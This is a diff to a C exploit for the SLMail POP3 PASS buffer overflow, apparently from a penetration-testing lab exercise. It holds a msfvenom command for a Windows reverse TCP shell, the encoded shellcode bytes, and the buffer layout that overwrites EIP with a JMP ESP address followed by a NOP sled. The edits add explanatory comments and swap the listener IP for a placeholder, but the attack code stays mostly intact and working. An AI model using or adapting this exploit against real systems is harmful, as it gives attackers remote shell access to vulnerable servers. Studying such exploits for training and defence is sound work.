@@ -8,7 +8,7 @@ SLMAIL REMOTE PASSWD BOF - Ivan Ivanovic Ivanov Иван-дурак
 #include <winsock2.h>
 #include <windows.h>
 
-// msfvenom -p windows/shell_reverse_tcp LHOST=10.11.0.107 LPORT=443 EXITFUNC=thread -f c -e x86/shikata_ga_nai -b "\x00\x0a\x0d"
+// msfvenom -p windows/shell_reverse_tcp LHOST=<localhost> LPORT=443 EXITFUNC=thread -f c -e x86/shikata_ga_nai -b "\x00\x0a\x0d"
 unsigned char shellcode[] = 
 "\xd9\xca\xd9\x74\x24\xf4\x58\x31\xc9\xba\xae\x02\x2d\xaa\xb1"
 "\x52\x31\x50\x17\x83\xe8\xfc\x03\xfe\x11\xcf\x5f\x02\xfd\x8d"
@@ -39,21 +39,22 @@ void exploit(int sock) {
       FILE *test;
       char *ptr;
       char userbuf[] = "USER madivan\r\n";
-      char evil[2977];
-      char buf[2977];
+      char evil[2977]; //Padding(2606) + EIP(4) + nopsled(16) + shellcode(351)
+      char buf[2977]; //use a buffer of just the right size
       char receive[1024];
       char nopsled[] = "\x90\x90\x90\x90\x90\x90\x90\x90"
                        "\x90\x90\x90\x90\x90\x90\x90\x90";
-      memset(buf, 0x00, 2977);
-      memset(evil, 0x00, 2977);
-      memset(evil, 0x43, 2977);
+      memset(buf, 0x00, 2977); //set "foundation" buffer to 0
+      memset(evil, 0x00, 2977); //set evil buffer initially to 0
+      memset(evil, 0x43, 2977); //set all 2977 bytes to "C"
       *(long*)&evil[2606] = 0x5f4a358f; // set EIP after 2606 "C"s to the JMP ESP address
-      ptr =&evil[2610];
+      ptr =&evil[2610]; //move pointer to char 2610 after adding EIP 
       memcpy(ptr, &nopsled, 16); //nopsled after EIP instr
-      ptr =&evil[2626];
-      memcpy(ptr, &shellcode, 351);
+      ptr =&evil[2626]; //move pointer to after nopsled
+      memcpy(ptr, &shellcode, 351); //add in shellcode
       
-
+/*Execute and profit!1!1!!*/
+      
       // banner
       recv(sock, receive, 200, 0);
       printf("[+] %s", receive);
